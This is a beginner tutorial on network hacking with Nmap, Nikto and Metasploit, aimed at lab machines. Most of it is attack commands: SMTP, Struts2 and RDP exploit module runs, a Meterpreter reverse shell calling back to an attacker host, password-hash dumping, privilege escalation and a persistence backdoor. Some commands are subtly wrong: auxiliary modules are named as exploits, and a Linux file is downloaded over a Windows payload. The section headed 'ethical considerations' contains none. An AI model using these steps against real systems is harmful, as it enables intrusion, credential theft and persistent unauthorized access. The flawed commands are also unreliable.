## Table of Contents
'
	1. Introduction to How Computers Communicate
	2.	How Data is Transferred in Networks
	3.	Setting Up Your Hacking Lab
	4.	Using Nmap for Network Scanning
	5.	Detailed Port Scanning
	6.	Getting Started with Metasploit
	7.	Common Exploits for SMTP, HTTP, RDP
	8.	Payloads: Gaining Control
	9.	Post-Exploitation: What to Do After a Successful Exploit
	10.	Wrap-Up: Targeting Vectors and Ethical Considerations

1. Introduction to How Computers Communicate

Computers communicate using network protocols, such as:

•	TCP/IP (Transmission Control Protocol/Internet Protocol): The basic communication language of the internet.
	•	HTTP (HyperText Transfer Protocol): Used for communication between web browsers and web servers.
	•	SMTP (Simple Mail Transfer Protocol): Used for sending emails.
	•	RDP (Remote Desktop Protocol): Used to remotely connect to and control a computer.

2. How Data is Transferred in Networks

	•	IP Addressing: Every device on a network has an IP address.
	•	Public IP: Exposed to the internet.
	•	Private IP: Used within internal networks.
	•	Ports: These gateways are used for communication:
	•	HTTP: Port 80 (443 for HTTPS)
	•	SMTP: Port 25
	•	RDP: Port 3389
	•	TCP vs UDP:
	•	TCP: Connection-oriented and reliable.
	•	UDP: Connectionless and faster but less reliable.

3. Setting Up Your Hacking Lab

	•	Use Kali Linux as your attacking machine.
	•	Set up virtual machines (VMs) with vulnerable OS like Metasploitable, Windows XP, or Windows 7.

Command to install necessary tools on Kali Linux:

sudo apt update && sudo apt install nmap metasploit-framework

4. Using Nmap for Network Scanning

Basic Network Scan

Scan active hosts and open ports:

nmap 192.168.1.1/24

Service Version Detection

Identify services running on the target:

nmap -sV 192.168.1.10

Scan All Ports

By default, Nmap scans the top 1000 ports. To scan all 65535 ports:

nmap -p- 192.168.1.10

Scan Specific Ports (HTTP, SMTP, RDP)

nmap -p 80,25,3389 192.168.1.10

OS Detection

Discover the operating system on the target machine:

nmap -O 192.168.1.10

5. Detailed Port Scanning

HTTP (Port 80/443)

	•	Use Nikto to scan for vulnerabilities:

nikto -h http://192.168.1.10

SMTP (Port 25)

	•	Enumerate email accounts:

nmap --script smtp-enum-users -p 25 192.168.1.10

``` RDP (Port 3389)```

	•	Check for vulnerabilities in RDP services:

```nmap --script rdp-vuln-ms12-020 -p 3389 192.168.1.10```

6. Getting Started with Metasploit

Starting Metasploit

Open Metasploit:

```msfconsole```

Searching for Exploits

Search for specific exploits by service, CVE number, or platform:

search smb
```search ms12-020```

Metasploit Modules
	•	Auxiliary: Scanners, fuzzers, and utilities.
	•	Exploits: Code that takes advantage of a vulnerability.
	•	Payloads: Code that runs after a successful exploit, e.g., reverse shell.
	•	Encoders: Obfuscate the payload to avoid antivirus detection.

7. Common Exploits for SMTP, HTTP, RDP

SMTP Exploit Example

Use:

```use exploit/windows/smtp/smtp_vrfy```

Set target IP:

```set RHOST 192.168.1.10```

Run the exploit:

```run```

HTTP Exploit Example

Use:
```use exploit/multi/http/struts2_content_type```

Set target IP and port:

set RHOST 192.168.1.10
```set RPORT 80```

Run the exploit:

```run```

RDP Exploit Example

Use:

```use exploit/windows/rdp/rdp_ms12_020```

Set target IP:

```set RHOST 192.168.1.10```

Run the exploit:

```run```

8. Payloads: Gaining Control

```Reverse Shell```

Set up a reverse shell where the target connects back to your machine:


```set PAYLOAD ``windows/meterpreter/reverse_tcp
set LHOST 192.168.1.20
set LPORT 4444```


Run the exploit:


```run```


Using Meterpreter

Once you get a Meterpreter session, you can run commands like:



•	Download files:

```download /etc/passwd```


•	Dump password hashes:

```hashdump```



9. Post-Exploitation: What to Do After a Successful Exploit

Privilege Escalation

Try to gain administrator/root privileges:

getsystem

Persistence

Ensure persistent access even after a reboot:

```persistence -U -i 10 -p 4444 -r 192.168.1.20```

10. Wrap-Up: Targeting Vectors and Ethical Considerations

Target Vectors

Open Ports: Services running on exposed ports can be vulnerable.
	•	Misconfigurations: Weak settings often lead to vulnerabilities.
	•	Unpatched Systems: Systems lacking security updates are easier to exploit.

